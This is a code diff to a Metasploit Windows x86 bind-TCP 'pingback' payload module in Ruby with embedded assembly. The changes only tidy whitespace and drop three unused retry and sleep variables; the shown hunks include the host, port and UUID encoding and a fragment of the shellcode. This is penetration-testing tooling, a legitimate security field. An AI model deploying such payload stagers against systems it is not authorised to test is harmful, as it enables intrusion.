@@ -7,6 +7,7 @@ require 'msf/core/payload/pingback'
 require 'msf/core/handler/bind_tcp'
 require 'msf/core/payload/windows/block_api'
 require 'msf/base/sessions/pingback'
+
 module MetasploitModule
 
   CachedSize = 324
@@ -27,14 +28,11 @@ module MetasploitModule
       'Arch'          => ARCH_X86,
       'Handler'       => Msf::Handler::BindTcp,
       'Session'       => Msf::Sessions::Pingback
-      ))
+    ))
 
     def generate_stage
       encoded_port = [datastore['LPORT'].to_i,2].pack("vn").unpack("N").first
       encoded_host = Rex::Socket.addr_aton(datastore['LHOST']||"127.127.127.127").unpack("V").first
-      retry_count  = [datastore['ReverseConnectRetries'].to_i, 1].max
-      pingback_count = datastore['PingbackRetries']
-      pingback_sleep = datastore['PingbackSleep']
       encoded_host_port = "0x%.8x%.8x" % [encoded_host, encoded_port]
       self.pingback_uuid ||= self.generate_pingback_uuid
       uuid_as_db = "0x" + self.pingback_uuid.to_s.gsub("-", "").chars.each_slice(2).map(&:join).join(",0x")
@@ -142,7 +140,7 @@ module MetasploitModule
           push ebx               ; push the hash of the exit function
           call ebp               ; ExitProcess(0)
       ^
-    Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
+      Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
     end
   end
 end
